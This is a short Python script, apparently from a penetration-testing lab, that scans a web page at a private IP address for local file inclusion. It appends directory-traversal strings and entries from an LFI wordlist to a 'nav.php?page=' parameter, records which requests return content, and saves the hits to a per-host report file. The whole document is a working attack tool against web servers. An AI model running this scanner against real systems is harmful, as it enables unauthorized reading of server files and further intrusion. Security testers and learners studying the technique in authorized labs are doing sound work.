# Check all combinaison http://172.16.1.10/nav.php?page=blog.html
import os

import requests

url = "http://172.16.1.10/nav.php?page=../../../../.."

wordlist = open("wordlist/lfi.txt", "r")
liste = []
for line in wordlist:
    line = line.rstrip()

    try:
        r = requests.get(url + line)
        content_length = int(r.headers['Content-Length'])
        if (r.status_code == 200 or r.status_code == 301) and content_length != 0:
            print(line)
            liste.append(line)
    except:
        pass

# Suppression des doublons
liste = list(dict.fromkeys(liste))

# Get IP machine
ip = url.split("/")[2]

# Check if the directory report/LFI/ exist
if not os.path.exists("report/LFI"):
    os.makedirs("report/LFI")

# Ecriture dans un fichier LFI_IP_machine.txt
fichier = open("report/LFI/LFI_" + ip + ".txt", "w")
for line in liste:
    fichier.write(line + "\n")
fichier.close()

print("LFI_" + ip + ".txt created without duplicates")

wordlist.close()
